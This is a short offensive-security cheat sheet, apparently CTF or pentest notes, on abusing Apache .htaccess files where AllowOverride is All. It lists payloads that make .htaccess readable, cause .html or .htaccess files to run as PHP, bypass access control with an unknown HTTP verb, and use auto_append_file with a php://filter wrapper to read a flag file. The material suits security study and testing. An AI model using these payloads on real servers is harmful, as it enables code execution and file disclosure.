
# Apache Configuration using .htaccess

`.htaccess` files are used to configure a web directory and its subdirectories.

# .htaccess

If `AllowOverride` is set to `All`, then malicious `.htaccess` will be interpreted as legit configuration files.

**Authorize reading**
```.htaccess
<Files ".htaccess">
    Require all granted
</Files>
```

**Redirect requests**
```
Options +FollowSymLinks
RewriteEngine On
RewriteRule ^folder1.*$ https://mydomain.com/ [R=301,L]
```

**Redirect requests**
```
# Convert http://exemple.com/blabla/blabla to http://exemple.com/private/flag.txt/blabla/blabla
Redirect 301 / /private/flag.txt

# Convert http://exemple.com/blabla/blabla to http://google.com/private/flag.txt/blabla/blabla
Redirect 301 / http://google.com
```

**Interpreting as PHP**
```
# It means that all files with an extension html will execute php
AddType application/x-httpd-php .html
```

```
AddType application/x-httpd-php .htaccess
```

**Bypass .htaccess by using unkown verb**
- Works only on very old versions
```
AAAA /flag.txt
```

**Auto Append file**
```bash
php_value auto_append_file "php://filter/convert.base64-encode/resource=/private/flag.txt"
```
# Resources
- http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster
- https://github.com/wireghoul/htshells/blob/master/traversal/mod_hitlog.traversal.htaccess
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
- https://httpd.apache.org/docs/2.2/fr/howto/htaccess.html
- https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
- http://archive.justanotherhacker.com/2011/05/htaccess-based-attacks.html
- https://blog.qualys.com/vulnerabilities-threat-research/2015/10/22/unrestricted-file-upload-vulnerability
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
- https://corz.org/server/tricks/htaccess.php